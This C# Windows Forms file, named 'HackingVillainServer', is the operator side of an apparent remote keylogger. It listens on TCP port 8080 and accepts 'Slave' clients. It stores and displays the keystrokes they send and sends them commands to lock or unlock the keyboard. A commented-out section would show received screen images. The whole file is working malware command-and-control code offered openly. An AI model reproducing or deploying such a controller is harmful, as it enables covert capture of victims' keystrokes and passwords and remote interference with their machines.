﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using AwesomeSockets.Domain.Sockets;
using AwesomeSockets.Sockets;

using Buffer = AwesomeSockets.Buffers.Buffer;

namespace HackingVillainServer
{
    public partial class Form1 : Form
    {
        ISocket _server;
        private List<Slave> _clients = new List<Slave>();
        Thread _listen;
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            this.BackgroundImageLayout = ImageLayout.Stretch;
            ImageList list = new ImageList();
            list.ImageSize = new Size(64, 64);
            list.Images.Add(Image.FromFile("쟌.png"));
            listView1.LargeImageList = list;
            _server = AweSock.TcpListen(8080);

            Connect();
            _listen = new Thread(() =>
            {
                while (true)
                {
                    Listen();
                }
            });
            _listen.Start();
        }

        ~Form1()
        {
            _listen.Abort();
        }

        public void Connect()
        {
            ISocket client = AweSock.TcpAccept(_server);
            _clients.Add(new Slave(client));

            this.listView1.Items.Add(client.GetRemoteEndPoint().ToString(), 0);
        }

        public void Listen()
        {
            Buffer inBuf = Buffer.New();
            AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
            Buffer.FinalizeBuffer(inBuf);

            var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf));
            _clients[0].KeyEvents.Add(k);
            Thread.Sleep(10);
            /*
            byte[] bytes = Buffer.GetBuffer(inBuf);
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                var img = Image.FromStream(ms);
                this.BackgroundImage = img;
            }
            */
        }

        private void 키보드KToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;

            var cl = _clients[listView1.SelectedItems[0].Index];
            new EventViewer(cl.KeyEvents).Show();
        }

        private void 활성화EToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Buffer b = Buffer.New();
            Buffer.Add(b, Encoding.UTF32.GetBytes("UnLock Key"));
            _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
        }

        private void 비활성화DToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Buffer b = Buffer.New();
            Buffer.Add(b, Encoding.UTF32.GetBytes("Lock Key"));
            _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
        }
    }
}